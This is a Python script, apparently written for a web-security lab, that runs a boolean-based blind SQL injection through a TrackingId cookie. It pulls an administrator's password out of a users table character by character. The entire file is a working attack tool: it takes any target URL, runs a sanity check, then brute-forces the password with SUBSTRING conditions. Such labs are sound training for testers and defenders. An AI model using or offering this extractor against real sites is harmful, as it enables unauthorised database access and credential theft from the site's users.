import requests
import string
import sys

def check(base_url, tracking_id, payload, true_signal):
    cookie = {"TrackingId": f"{tracking_id}' AND {payload}--"}
    r = requests.get(base_url, cookies=cookie)
    return true_signal in r.text

def main():
    print("=== Blind SQL Injection Extractor (Boolean-based) ===\n")
    print("NOTE: This only works if the target is confirmed vulnerable to")
    print("boolean-based blind SQL injection via a cookie parameter.")
    print("Confirm manually first (e.g. testing ' AND '1'='1 vs ' AND '1'='2)")
    print("before relying on this script.\n")

    base_url = input("Enter the target URL: ").strip()
    if not base_url.endswith("/"):
        base_url += "/"

    tracking_id = input("Enter your current TrackingId cookie value: ").strip()

    true_signal = input(
        "Enter the TRUE signal — a string that appears ONLY when your\n"
        "injected condition is true (e.g. 'Welcome back', or any text\n"
        "unique to the true-condition page): "
    ).strip()

    table = input("Table name [default: users]: ").strip() or "users"
    username_col = input("Username column [default: username]: ").strip() or "username"
    password_col = input("Password column [default: password]: ").strip() or "password"
    target_user = input("Username to extract password for [default: administrator]: ").strip() or "administrator"

    # Sanity check first
    sanity_condition = f"(SELECT {username_col} FROM {table} WHERE {username_col}='{target_user}')='{target_user}'"
    print("\nRunning sanity check...")
    if not check(base_url, tracking_id, sanity_condition, true_signal):
        print("Sanity check FAILED — the true signal did not appear.")
        print("Double check: URL, fresh TrackingId, true_signal text,")
        print("table/column names, and target username.")
        sys.exit(1)
    print("Sanity check passed. Starting extraction...\n")

    charset = string.ascii_letters + string.digits + "!@#$%^&*_-"
    password = ""

    for position in range(1, 33):
        found = False
        for char in charset:
            # escape single quotes in the char just in case
            safe_char = char.replace("'", "''")
            condition = (
                f"(SELECT SUBSTRING({password_col},{position},1) "
                f"FROM {table} WHERE {username_col}='{target_user}')='{safe_char}'"
            )
            if check(base_url, tracking_id, condition, true_signal):
                password += char
                print(f"Position {position}: '{char}'  -> so far: {password}")
                found = True
                break
        if not found:
            print("\nNo more characters found — extraction complete.")
            break

    print(f"\nFinal extracted password: {password}")

if __name__ == "__main__":
    main()
